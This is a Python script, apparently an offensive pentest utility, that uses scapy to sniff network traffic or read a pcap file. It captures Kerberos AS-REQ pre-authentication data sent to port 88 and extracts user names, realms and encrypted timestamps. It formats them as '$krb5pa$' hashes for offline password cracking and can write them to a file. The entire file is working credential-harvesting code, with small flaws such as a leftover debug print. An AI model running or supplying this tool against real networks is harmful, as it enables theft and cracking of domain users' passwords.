import argparse
from os import geteuid, devnull

from scapy.all import *
conf.verb=0  ## scapy no verbose
import atexit


encTypes={
        '1':"des-cbc-crc" ,
        '2':"des-cbc-md4" ,
        '3':"des-cbc-md5",
        '4':"[reserved]" ,
        '5':"des3-cbc-md5",
        '6':"[reserved2]",
        '7':"des3-cbc-sha1",
        '9':"dsaWithSHA1-CmsOID",
        '10': "md5WithRSAEncryption-CmsOID",
        '11':"sha1WithRSAEncryption-CmsOID",
        '12':"rc2CBC-EnvOID" ,
        '13': "rsaEncryption-EnvOID",
        '14':"rsaES-OAEP-ENV-OID"    ,
        '15': "des-ede3-cbc-Env-OID" ,
        '16': "des3-cbc-sha1-kd"    ,
        '17':"aes128-cts-hmac-sha1-96",
        '18': "aes256-cts-hmac-sha1-96",
        '23': "rc4-hmac"   ,
        '24': "rc4-hmac-exp",
        '65':   "subkey-keymaterial",
}


hashes=[]
file = ''
count = 1

def parse_args():
   """Create the arguments"""
   parser = argparse.ArgumentParser()
   parser.add_argument("-i", "--interface", help="Choose an interface")
   parser.add_argument("-p", "--pcap", help="Parse info from a pcap file; -p <pcapfilename>")
   parser.add_argument("-o", "--out", help="specify a a file to store hashes")
   # parser.add_argument("-v", "--verbose", help="show more information about packets")
   return parser.parse_args()


def write_hashes():
    print('ssss ',file)
    if file != '':
        f = open(file, "w")
        for hash in hashes:
            f.write(hash)
            f.write('\r')
        print("hashes are saved in "+ file)
        f.close()





def get_asreq_encType(hpayload):
        pvno = hpayload[24:26]  ##05
        MsgType = hpayload[34:36]  ##0a
        EncType = hpayload[78:80]  ##17
        pdataType = hpayload[56:58]  ##02  encrypted timestamp message
        ## convert hex to decimal
        pvno_d = int(pvno, 16)
        MsgType_d = int(MsgType, 16)
        pdataType_d = int(pdataType, 16)
        # EncType_d = int(EncType, 16)

        # print(" pvno  : [\\x"+pvno+"] - "+str(pvno_d))
        # print(" message type : [\\x"+MsgType+"] - "+str(MsgType_d))
        # print(" enc type : [\\x"+EncType+"] - "+str(EncType_d)+":"+encTypes[str(EncType_d)])
        # print(" pdata type_2 : [\\x"+pdataType+"] - "+str(pdataType_d))
        if pvno_d==5 and MsgType_d==10 and pdataType_d==2:
            return EncType
        else:
            return False


def assemble_final_Hash(eType, realm, cName, hash):
    hash_start = '$krb5pa$'
    encType_d = int(eType, 16)
    final_hash = hash
    if encType_d==18 or encType_d==17:
        final_hash = hash_start+str(encType_d)+"$"+cName+"$"+realm+"$"+hash
        hashes.append(final_hash)
        print(final_hash)
    elif encType_d==23:
        final_hash= hash_start + str(encType_d) + "$" + cName + "$" + realm + "$salt$" + hash
        hashes.append(final_hash)
        print(final_hash)
    else:
        print(str(encType_d)+" not yet supported !")
        hashes.append(final_hash +str(encType_d)+"  (not yet supported!)" )

def extract_hash(hpayload,encType):
    pData_Header = hpayload[44:]
    hashes=[]
    hash = pData_Header[44:pData_Header.index("3011a10402")]  ##untill the start of PAC header
    hashes.append(hash)
    ### find Cname and Realm
    checkptStr = ""
    if ("a003020101" in hpayload):  ##name-type: kRB5-NT-PRINCIPAL (1)
        checkptStr = "a003020101"
    elif ("a00302010a" in hpayload):  ##name-type: kRB5-NT-ENTERPRISE-PRINCIPAL (10)
        checkptStr = "a00302010a"

    cName_checkPoint = hpayload.index(checkptStr) + 20  ## start from cName size
    cName_size = hpayload[cName_checkPoint:cName_checkPoint + 2]  ## extract cname size
    cName_size_d = int(cName_size, 16)  ## cname in decimal
    cName_start = cName_checkPoint + 2
    cName_end = cName_start + (cName_size_d * 2)
    cNameH = hpayload[cName_start:cName_end]
    cName = bytes.fromhex(cNameH).decode('utf-8')
    print("cname : " + cNameH + "  :  " + cName)

    realm_checkPoint = cName_end + 6  ## start with realm size
    realm_size = hpayload[realm_checkPoint:realm_checkPoint + 2]
    realm_size_d = int(realm_size, 16)
    realm_start = realm_checkPoint + 2
    realm_end = realm_start + (realm_size_d * 2)
    realmH = hpayload[realm_start:realm_end]
    realm = bytes.fromhex(realmH).decode('utf-8')
    print("realm : " + realmH + "  :  " + realm)
    assemble_final_Hash(encType, realm, cName, hash)



def pkt_parser(pkt):
    '''
    Start parsing packets here
    '''

    # Get rid of Ethernet pkts with just a raw load cuz these are usually network controls like flow control
    if pkt.haslayer(Ether) and pkt.haslayer(Raw) and not pkt.haslayer(IP) and not pkt.haslayer(IPv6):
        print("Ether")
        return


    # UDP
    if pkt.haslayer(UDP) and pkt.haslayer(IP) and pkt.haslayer(Raw): ## maybe later we specify ports
        if pkt[UDP].dport == 88:
            proto="UDP"
            src_ip_port = str(pkt[IP].src) + ':' + str(pkt[UDP].sport)
            dst_ip_port = str(pkt[IP].dst) + ':' + str(pkt[UDP].dport)
            hpayload = pkt[Raw].load.hex()
            encType = get_asreq_encType(hpayload)
            if(encType):
                print('packet No: ' + str(count) + "...")
                print("UDP from ", src_ip_port, " to ", dst_ip_port)
                extract_hash(hpayload,encType)


    ## TCP
    elif pkt.haslayer(TCP) and pkt.haslayer(IP) and pkt.haslayer(Raw): ## maybe later we specify ports to check faster
        proto="TCP"
        if pkt[TCP].dport ==88:
            src_ip_port = str(pkt[IP].src) + ':' + str(pkt[TCP].sport)
            dst_ip_port = str(pkt[IP].dst) + ':' + str(pkt[TCP].dport)
            raw =pkt[Raw].load.hex()
            hpayload = raw[8:]
            encType = get_asreq_encType(hpayload)
            if(encType):
                print('packet No: ' + str(count) + "...")
                print("TCP from ", src_ip_port, " to ", dst_ip_port)
                extract_hash(hpayload,encType)
    else:
        return




def main(args):
    if args.pcap:
        try:
            for pkt in PcapReader(args.pcap):
                pkt_parser(pkt)
                global count
                count = count+1

            print('\n\nhashes found :')
            for hash in hashes:
                print(hash)
        except IOError:
            exit('[-] Could not open %s' % args.pcap)

    else:
        # Check for root
        if geteuid():
            exit('[-] Please run as root')
        # pass


    if args.interface:
        conf.iface = args.interface
        print('[*] Using interface:  ', conf.iface)
        sniff(iface=conf.iface, prn=pkt_parser, store=0)

    if args.out:
        global file
        file = args.out
        atexit.register(write_hashes)




if __name__ == "__main__":
   main(parse_args())









